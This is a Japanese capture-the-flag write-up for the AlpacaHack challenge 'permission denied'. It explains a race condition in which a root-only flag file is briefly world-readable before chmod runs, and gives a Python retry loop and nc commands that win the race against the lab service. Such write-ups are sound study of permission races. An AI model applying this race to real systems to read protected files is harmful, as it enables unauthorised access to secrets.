# permission denied

https://alpacahack.com/daily/challenges/permission-denied

## 問題の概要

サーバーに接続すると `root` 権限で `chal.sh` が実行されます。

```bash
echo Alpaca{REDACTED} > flag.txt
chmod 400 flag.txt
runuser -u nobody -- sh
rm flag.txt
```

`chal.sh` は `flag.txt` を作成し、`root` のみが読み取れるようにしてから `nobody` ユーザーでシェルを起動します。

シェル内で自由にコマンドを実行できますが、`flag.txt` は `nobody` からは読み取れないため、フラグを取得することができません。

```bash
$ nc localhost 1337
$ cat flag.txt
cat: flag.txt: Permission denied
$ ls -la
total 16
drwxr-xr-x 1 root root 4096 Apr 28 16:42 .
drwxr-xr-x 1 root root 4096 Apr 28 15:23 ..
-r-------- 1 root root   88 Apr 17 16:08 chal.sh
-r-------- 1 root root   17 Apr 28 16:42 flag.txt
```

## 解法

`echo Alpaca{REDACTED} > flag.txt` で `flag.txt` を作成した直後の権限設定は `-rw-r--r--` で、`nobody` ユーザーでも `flag.txt` を読み取ることができます。
`chmod 400 flag.txt` に変更されるまでのわずかな間に `flag.txt` を読み取ることができれば、フラグを取得できます。

## 解答に使用したコード

コンテナ内で Python を使用できるようになっているため、Python を起動して `flag.txt` を読み取るコードを実行します。

bash の実行よりオーバーヘッドが小さく、高速に `flag.txt` の読み取りを試行できます。

```python
while True:
    try:
        with open("flag.txt", "r") as f:
            print(f.read())
            break
    except:
        pass

exit(0)
```

```bash
(echo python; cat code.py; echo exit) | nc localhost 1337
```

同時に別のターミナルから接続して `chal.sh` を複数回実行させると、タイミングがよければ Python で `flag.txt` を読み取れます。

```bash
for i in {1..5}; do echo exit | nc localhost 1337; done
```
